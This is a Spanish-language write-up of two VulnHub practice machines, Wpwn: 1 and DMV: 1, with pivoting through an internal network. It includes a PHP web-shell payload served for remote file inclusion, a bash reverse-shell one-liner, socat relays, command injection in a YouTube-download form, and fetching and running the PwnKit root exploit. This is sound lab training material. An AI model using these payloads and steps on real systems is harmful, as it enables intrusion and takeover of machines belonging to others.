---
title: VH - Wpwn -> DMV ( Pivoting Lab )
published: true
categories: [Linux]
tags: [eCPPTv2, eWPT, Pivoting, Fácil]
---

<img src="/assets/VH/vulnhub.png">

¡Hola!
Vamos a resolver de la máquina [Wpwn: 1](https://www.vulnhub.com/entry/wpwn-1,537/) de dificultad "Fácil" de la plataforma `VulnHub` para posteriormente hacer pivoting a la máquina [DMV: 1](https://www.vulnhub.com/entry/dmv-1,462/) de dificultad "Fácil" de la plataforma `VulnHub`

Técnicas Vistas (Wpwn: 1): 

- **Note: On this machine we have configured an internal network to Pivot to DMV: 1**
- **Web Enumeration**
- **WordPress Enumeration**
- **Substitution filtering from BurpSuite to make the WordPress page work properly**
- **WordPress Plugin Social Warfare < 3.5.3 Exploitation (RFI to RCE)**
- **Password Reuse (User Pivoting)**
- **Abusing sudo group [Privilege Escalation]**
- **EXTRA: Creation of bash script to discover computers on the internal network**
- **EXTRA: Creation of bash script to discover the open ports of the computers discovered in the internal network**
- **Playing with SSH in order to apply local port forwarding**

Técnicas Vistas (DMV: 1): 

- **Web Enumeration**
- **Youtube-dll Web Utility Exploitation (Command Injection + SOCAT in order to jump to the new sub-network)**
- **PwnKit CVE-2021-4034 Exploitation [Privilege Escalation]**

### Preparación Entorno

* * *

Antes de iniciar la fase de enumeración y reconocimiento procederemos a crear un directorio de trabajo con el nombre `Player`. Una vez creado accedemos al directorio y con la ayuda de la función que tenemos definida en la zshrc `mkt` crearemos cuatro directorios de trabajo `nmap, content, exploits y scripts` donde almacenaremos de una manera ordenada toda la información que vayamos recopilando de la máquina en función de su naturaleza.

```bash
function mkt(){
    mkdir {nmap,content,exploits,scripts}
}
```

### Reconocimiento (Wpwn: 1)

* * *

Primero de todo necesitamos saber la IP de la máquina víctima que se encuentra funcionando dentro de nuestra red local. Procedemos a escanear todos los equipos de nuestra red local

```bash
arp-scan -I ens33 --localnet
Interface: ens33, type: EN10MB, MAC: 00:0c:29:8d:05:79, IPv4: 192.168.1.148
Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.1.1	e4:ca:12:8c:78:a5	zte corporation
192.168.1.129	2c:f0:5d:0a:0a:f1	(Unknown)
192.168.1.134	9c:20:7b:b1:3e:47	Apple, Inc.
192.168.1.141	00:0c:29:aa:96:5f	VMware, Inc.
192.168.1.138	00:55:da:56:56:66	IEEE Registration Authority
192.168.1.130	ac:67:84:98:f6:07	(Unknown)
192.168.1.173	b8:bc:5b:e8:00:67	Samsung Electronics Co.,Ltd
192.168.1.131	d8:a3:5c:73:eb:02	(Unknown)
192.168.1.137	f4:34:f0:50:7e:76	(Unknown)
192.168.1.144	b8:bc:5b:e8:00:67	Samsung Electronics Co.,Ltd
```
Tras analizar la respuesta del escaneo observamos por el **OUI (Organizationally unique identifier)** 00:0c:29 que corresponde a VMWare Inc ya que la máquina víctima funciona bajo un entorno de virtualización VMWare por lo que su IP es `192.168.1.141`

Accedemos al directorio de trabajo `nmap` e iniciamos nuestra fase de reconocimiento realizando un `ping` a la IP de la máquina para comprobar que esté activa y detectamos su sistema operativo basándonos en el `ttl` de una traza **ICMP**.

```ruby
❯ ping -c 1 192.168.1.141
PING 192.168.1.141 (192.168.1.141) 56(84) bytes of data.
64 bytes from 192.168.1.141: icmp_seq=1 ttl=64 time=42.3 ms

--- 1192.168.1.149 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 42.314/42.314/42.314/0.000 ms
```
Identificamos que es una maquina **Linux** debido a su ttl (time to live) correspondiente a 64.

* TTL => 64 Linux
* TTL => 128 Windows

Continuamos con la enumeración de los **65535** puertos en la máquina.

```ruby
nmap -p- --open --min-rate 5000 -vvv -n -Pn 192.168.1.141 -oG allPorts

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: 00:0C:29:AA:96:5F (VMware)
```
Luego de identificar los puertos abiertos `OPEN`, se procede a escanear servicios y versiones que puedan estar corriendo en los puertos abiertos detectados.

```ruby
nmap -sCV -p22,80 192.168.1.141 -oN targeted

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 59b7dbe0ba6376afd0200311e13c0e34 (RSA)
|   256 2e20567584ca35cee36a21321fe7f59a (ECDSA)
|_  256 0d02838b1a1cec0fae74cc7bda12899e (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Site doesn't have a title (text/html).
MAC Address: 00:0C:29:AA:96:5F (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Reconocimiento Web (Wpwn: 1)

* * *

Iniciamos el reconocimiento del servicio web con la herramienta `whatweb` la cual nos muestra información sobre las tecnologías web que incluyen sistemas de gestión de contenido (CMS), plataformas de blogs, paquetes de estadísticas / análisis, bibliotecas JavaScript, servidores web y dispositivos integrados.

```bash
❯ whatweb http://192.168.1.141
http://192.168.1.141 [200 OK] Apache[2.4.38], Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.38 (Debian)], IP[192.168.1.141]
```

Accedemos al servicio http y observamos un mensaje que nos dejó el creador de la máquina

<img src="/assets/VH/Wpwn-DMV/web.png">

Continuamos aplicando fuzzing para localizar posibles rutas

```bash
❯ wfuzz -c --hc=404 -t 200 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt "http://192.168.1.141/FUZZ"
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.1.141/FUZZ
Total requests: 220546

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                       
=====================================================================

000000573:   301        9 L      28 W       318 Ch      "wordpress"
```

Accedemos al directorio encontrado y vemos que se trata de un WordPress, pero vemos que no se visualiza correctamente. Observando el código fuente vemos que los recursos apuntan a una dirección IP `192.168.1.12` 

<img src="/assets/VH/Wpwn-DMV/uglywordpress.png">
<img src="/assets/VH/Wpwn-DMV/source.png">

Parece que el creador de la máquina no ha tenido en cuenta que se pueda asignar otra IP diferente. Con la herramienta BurpSuite craremos unas reglas para que todos los recursos que apunten a la Ip 192.168.1.12 los sustituya por nuestra IP 192.168.1.141. Nos dirigimos a `Proxy > Options > Match and Replace` y creamos una nueva regla

<img src="/assets/VH/Wpwn-DMV/burpsuite.png">

Recargamos la página y ya la vemos correctamente

<img src="/assets/VH/Wpwn-DMV/wordpressok.png">

### Enumeración WordPress (Wpwn: 1)

* * *

Con la herramienta `WpScan` localizamos plugin vulnerable a RCE `Social Warfare`

```ruby
❯ wpscan --url http://192.168.1.141/wordpress/ --enumerate vp --plugins-detection aggressive --api-token $APIKEY --force
.
.
.
| [!] Title: Social Warfare <= 3.5.2 - Unauthenticated Remote Code Execution (RCE)
 |     Fixed in: 3.5.3
 |     References:
 |      - https://wpscan.com/vulnerability/7b412469-cc03-4899-b397-38580ced5618
 |      - https://www.webarxsecurity.com/social-warfare-vulnerability/
 .
 .
 .
```

Con la herramienta `searchsploit` buscamos vulnerabilidades asociadas al plugin `Social Warfare`

```bash
❯ searchsploit Social Warfare
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                               |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
WordPress Plugin Social Warfare < 3.5.3 - Remote Code Execution                                                                                                              | php/webapps/46794.py
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
```

Observando el contenido del script observamos una ruta `VULNPATH` la cual aparentemente apunta a una URL. Esto nos lleva a pensar que se puede acontecer un RFI (Remote File Inclusion) en donde podemos apuntar a un archivo remoto en otro servidor

<img src="/assets/VH/Wpwn-DMV/vulnpath.png">

Accediendo al enlace de referencia incluido en las primeras líneas del script observamos en el PoC como debería ser la estructura del archivo

<img src="/assets/VH/Wpwn-DMV/poc.png">

En este punto creamos un arhivo de prueba `test.txt` e incluimos el código del PoC para que nos muestre el `/etc/passwd`. Lo servimos con un servidor web con Python

```bash
❯ cat test.txt
───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: test.txt
───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ <pre>system('cat /etc/passwd')</pre>
───────┴───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Accediendo al path vulnerable localizado en el script y apuntando a nuestro servidor HTTP confirmamos que se acontece el RFI y nos muestra el archivo `/etc/passwd`

<img src="/assets/VH/Wpwn-DMV/passwd.png">

Modificamos el archivo `test.txt` para que mediante el método `GET` podamos ejecutar comandos con el parámetro `cmd`

```bash
❯ cat test.txt
───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: test.txt
───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ <pre>system($_GET['cmd'])</pre>
───────┴───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

Confirmamos que tenemos capacidad de RCE

<img src="/assets/VH/Wpwn-DMV/rce.png">

En este punto sólo nos queda ponernos en escucha en el puerto 443 y ejecutar onliner para entablar una reverse shell y ganar acceso a la máquina

<img src="/assets/VH/Wpwn-DMV/shell.png">

```bash
❯ sudo nc -nlvp 443
[sudo] password for yorch: 
listening on [any] 443 ...
connect to [192.168.1.148] from (UNKNOWN) [192.168.1.141] 59106
whoami
www-data
```

### Movimiento Lateral (Wpwn: 1)

* * *

Comenzamos con la anumeración del sistema. En la ruta `/var/www/html/wordpress` vemos un archivo `wp-config.php`. Listamos su contenido y obtenemos unas credenciales para `MySQL`

```bash
www-data@wpwn:/var/www/html/wordpress$ cat wp-config.php
.
.
.
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress_db' );

/** MySQL database username */
define( 'DB_USER', 'wp_user' );

/** MySQL database password */
define( 'DB_PASSWORD', 'R3&]vzhHmMn9,:-5' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );

/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );
.
.
.
```

Vemos que dentro de la carpeta `/home` hay un directorio del usuario `takis`. probamos si hubiera reutilización de credenciales y logramos migrar al usuario takis. En su directorio personal localizamos la primera flag

```bash
www-data@wpwn:/home$ ls
takis
www-data@wpwn:/home/takis$ su takis
Password: 
takis@wpwn:~$ cat user.txt
04ebbbf5e6e298e8fab6deb92deb3a7f
```

### Escalada de Privilegios (Wpwn: 1)

* * *

Listando privilegios de sudo observamos que podemos ejecutar cualquier comando como sudo

```bash
takis@wpwn:~$ sudo -l
Matching Defaults entries for takis on wpwn:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User takis may run the following commands on wpwn:
    (ALL) NOPASSWD: ALL
takis@wpwn:~$ sudo su
root@wpwn:/home/takis# whoami
root
```

Hemos completado la máquina **Wpwn: 1** de VulnHub!!

### Reconocimiento (DMV: 1)

* * *

Iniciamos el reconocimiento de la máquina `DMV: 1`. Necesitamos saber su IP y los puertos abiertos que tiene esta máquina. Para ello nos haremos un pequeño script en bash el cual nos ayudará con la tarea. Sabiendo que la IP de la máquina Wpwn en el segmento es 10.10.0.145 vamos a escanear todas las IP en el segmento `10.10.0.0/24`

```bash
root@wpwn:/home/takis# hostname -I
192.168.1.141 10.10.0.145 fd89:c343:c759:42dc:20c:29ff:feaa:965f 
```

```bash
#!/bin/bash

for i in $(seq 1 254); do
        timeout 1 bash -c "ping -c 1 10.10.0.$i" &>/dev/null && echo "[+] Host 10.10.0.$i - ACTIVO" &
done; wait
```
```bash
root@wpwn:/tmp# ./hostDiscovery.sh 
[+] Host 10.10.0.1 - ACTIVO
[+] Host 10.10.0.145 - ACTIVO
[+] Host 10.10.0.144 - ACTIVO
```
Ya sabemos que la IP de la máquina `DMV: 1` es la 10.10.0.144. Ahora procedemos a enumerar los puertos abiertos mediante otro script en bash

```bash
#!/bin/bash

for port in $(seq 1 65535); do
        timeout 1 bash -c "echo '' > /dev/tcp/10.10.0.144/$port" 2>/dev/null && echo "[+] Port $port - OPEN" &
done; wait
```

```bash
root@wpwn:/tmp# ./portDiscovery.sh 
[+] Port 22 - OPEN
[+] Port 80 - OPEN
```
A partir de este punto para trabajar más cómodamente vamos a crear un túnel por el cual vamos a poder acceder a la máquina `DMV: 1` desde nuestro equipo atacante a pesar de no tener conexión directa al no estar en el mismo segmento. Como disponermos de las credenciales del usuario takis utilizaremos la herramienta SSH para aplicar Port Forwarding y traernos a nuestra máquina el puerto 80 abierto de la máquina DMV

```bash
#Atacante
❯ ssh takis@192.168.1.141 -L 80:10.10.0.144:80
takis@192.168.1.141's password: 
Linux wpwn 4.19.0-10-amd64 #1 SMP Debian 4.19.132-1 (2020-07-24) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Feb  8 06:21:25 2023 from 192.168.1.148
takis@wpwn:~$ 
```

Ya podemos acceder al servicio web a través de nuestro localhost

<img src="/assets/VH/Wpwn-DMV/web2.png">


### Reconocimiento Web (DMV: 1)

* * *

Iniciamos el reconocimiento Web. Parece un servicio de conversión de vídeos de YouTube. Vamos a introducir un número aleatorio en el input e interceptar la petición con BurpSuite. Enviamos petición al repeater y observamos la respuesta

<img src="/assets/VH/Wpwn-DMV/youtube.png">

Buscando en Google el error que nos devuelve la petición vemos que se trata de una herramienta `youtube-dl` que sirve para descargar vídeos de youtube. Sustituimos el enlace del vídeo de youtube a descargar por `--help` y observamos en el output el panel de ayuda de la aplicación. Entendemos que lo que pongamos en el parámetro `yt_url=` se va a ejecutar a nivel de sistema. Probamos a ejecutar `whoami` y observamos parte del output en la respuesta pero de forma incompleta

<img src="/assets/VH/Wpwn-DMV/whoami.png">

Intentamos cargar el archivo `/etc/passwd` y vemos que de la misma forma nos lo muestra incompleto


<img src="/assets/VH/Wpwn-DMV/passwd2.png">

Probamos a insertar un carácter especial antes del comando para ver si de alguna forma cierra la consulta a nivel de comando. para ello nos serviremos de la herramienta `Intruder` de BurpSuite y cargaremos un diccionario de Seclist `special-chars.txt` y observamos la longitud de la respuesta. Vemos que los caracteres `<` y `>` nos devuelven una respuesta de longitud mayor al resto y conseguimos mostrar el `/etc/passwd` entero

<img src="/assets/VH/Wpwn-DMV/intruder.png">

En este punto ya tenemos plena capacidad de ejcución remota de comandos. Para que las peticiones lleguen a nuestra máquina atacante debemos redirigir las mismas con la herramienta `socat` de la máquina `Wpwn` a nuestro equipo. A la vez creamos un archivo index.html para entablar una reverse shell, el cual serviremos mediante un servidor HTTP con Python. Con socat redirigiremos la petición de la reverse shell a nuestro equipo


```bash
#Wpwn
root@wpwn:/tmp# socat TCP-LISTEN:4545,fork TCP:192.168.1.148:2323

#ATACANTE
❯ python3 -m http.server 2323
Serving HTTP on 0.0.0.0 port 2323 (http://0.0.0.0:2323/) ...
```

```bash
❯ cat index.html
───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: index.html
───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ #!/bin/bash
   2   │ 
   3   │ bash -i >& /dev/tcp/10.10.0.145/7878 0>&1
───────┴───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

```bash
#Wpwn
root@wpwn:/home/takis# socat TCP-LISTEN:7878,fork TCP:192.168.1.148:9898

#ATACANTE
❯ nc -nlvp 9898
listening on [any] 9898 ...
```
Ejecutamos curl desde BurpSuite y ganamos acceso a la máquina DMV

```bash
❯ nc -nlvp 9898
listening on [any] 9898 ...
connect to [192.168.1.148] from (UNKNOWN) [192.168.1.141] 52910
bash: cannot set terminal process group (1067): Inappropriate ioctl for device
bash: no job control in this shell
www-data@dmv:/var/www/html$ whoami
whoami
www-data
```

### Escalada de Privilegios (DMV: 1)

* * *

Listamos archivos de la máquina con permiso SUID y localizamos `pkexec`

```bash
www-data@dmv:/$ find \-perm -4000 2>/dev/null
.
.
.
./usr/bin/pkexec
.
.
```

Nos descargamos la herramienta `PwnKit` del github de [ly4k](https://github.com/ly4k/PwnKit) y aprovechando los túneles creados levantamos nuevamente un serrvidor HTTP por el puerto 2323 y en la máquina DMV mediante wget a través del puerto 4545 nos traemos el binario a la máquina. Le damos permisos de ejecución y al ejecutarlo ganamos privilegios de root. La flag la encontramos en `/root/root.txt`

```bash
www-data@dmv:/tmp$ wget http://10.10.0.145:4545/PwnKit
--2023-02-08 13:03:30--  http://10.10.0.145:4545/PwnKit
Connecting to 10.10.0.145:4545... connected.
HTTP request sent, awaiting response... 200 OK
Length: 18040 (18K) [application/octet-stream]
Saving to: 'PwnKit'

PwnKit                                              100%[==================================================================================================================>]  17.62K  --.-KB/s    in 0.001s  

2023-02-08 13:03:30 (20.6 MB/s) - 'PwnKit' saved [18040/18040]

www-data@dmv:/tmp$ ls
PwnKit
www-data@dmv:/tmp$ chmod +x PwnKit 
www-data@dmv:/tmp$ ./PwnKit 
root@dmv:/tmp# whoami
root
root@dmv:~# cat /root/root.txt
flag{d9b368018e912b541a4eb68399c5e94a}
```



Hemos completado la máquina **DMV: 1** de VulnHub!! Happy Hacking!!